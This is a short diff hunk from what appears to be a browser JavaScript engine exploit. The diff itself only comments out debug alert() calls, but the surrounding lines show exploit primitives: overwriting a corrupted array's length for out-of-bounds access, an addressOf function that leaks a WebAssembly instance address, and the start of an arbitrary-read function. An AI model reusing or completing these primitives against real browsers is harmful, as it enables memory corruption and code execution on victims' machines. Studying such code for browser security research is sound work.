@@ -125,14 +125,14 @@
         let element_addr = f2i(cruppted_arr[7]) & 0xffffffffn;
         //alert("[+]element addr : " + hex(element_addr));
         cruppted_arr[7] = i2f((0x1122n << 32n) + element_addr);
-        alert("[+]oob arr length : " + hex((cruppted_arr.length)));
+        //alert("[+]oob arr length : " + hex((cruppted_arr.length)));
 
         var obj_idx = 16;
         function addressOf(){
           return f2i(cruppted_arr[obj_idx])-0x1n;
         }
         let wasm_instance_addr = addressOf();
-        alert("[+]wasm instance addr : " + hex(wasm_instance_addr));
+        //alert("[+]wasm instance addr : " + hex(wasm_instance_addr));
         var element_idx = 13;
 
         function arb_read(addr){
